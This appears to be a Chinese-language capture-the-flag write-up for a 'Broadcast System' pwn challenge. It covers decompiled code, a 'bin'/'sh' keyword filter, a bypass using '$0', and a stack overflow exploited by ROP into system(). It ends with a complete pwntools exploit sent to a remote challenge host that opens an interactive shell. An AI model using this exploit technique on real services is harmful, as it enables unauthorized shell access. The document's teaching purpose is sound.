打开程序，发现是一个广播系统
一开始需要输入一个channel
在IDA中main函数里发现了这里的使用
```c
  puts("Please select a broadcast channel(1-100)");
  read(0, buf, 0x10uLL);
```
这里的buf不是一个局部变量，而是一个全局变量，存在0x6020D0
同时下一个函数会对这个buf进行检查
```c
char *__fastcall bbash_check(const char *a1)
{
  char *result; // rax

  if ( strstr(a1, "bin") || (result = strstr(a1, "sh")) != 0LL )
  {
    puts("--------------------------------------");
    puts("*********Attack detected**************");
    puts("--------------------------------------");
    system("echo 'get out of here!'");
    exit(0);
  }
  return result;
}
```
可以发现，如果buf含有bin或sh，会检测失败，同时这里带有system函数，考虑利用这个system
在MENU中的broadcast功能中，有一个栈溢出
```c
ssize_t broad()
{
  char buf; // [rsp+0h] [rbp-10h]

  puts("Please input the message you want to broadcast:");
  return read(0, &buf, 0x30uLL);
}
```
所以考虑利用这个溢出来劫持RIP跳到system函数执行的地方
至于system函数的参数可以利用buf来传递
也就是构造 system(buf)
参数的问题可以利用ropgadget，然后再ret到call system的地方
至于buf的内容，由于bin,sh都被过滤了，不能直接用
但是 $0 等价于 /bin/sh
于是往buf中写入 $0 然后劫持rip到pop rdi 再 ret 到 call system ，即可

完整 exp:
```python
from pwn import *
context.log_level = 'debug'
#p = process('./Broadcast System')
p = remote('39.97.167.120', '56725')
e = ELF('./Broadcast System')
p.recv()
p.sendline('$0\x00')


def broad(text):
    p.recvuntil('choice:\n')
    p.sendline('B')
    p.recvuntil('broadcast:\n')
    p.send(text)


pop_rdi = 0x400de3

padding = 'a'*24
payload = padding+p64(pop_rdi)+p64(0x6020D0)+p64(0x400AFB)


broad(payload)

p.interactive()
```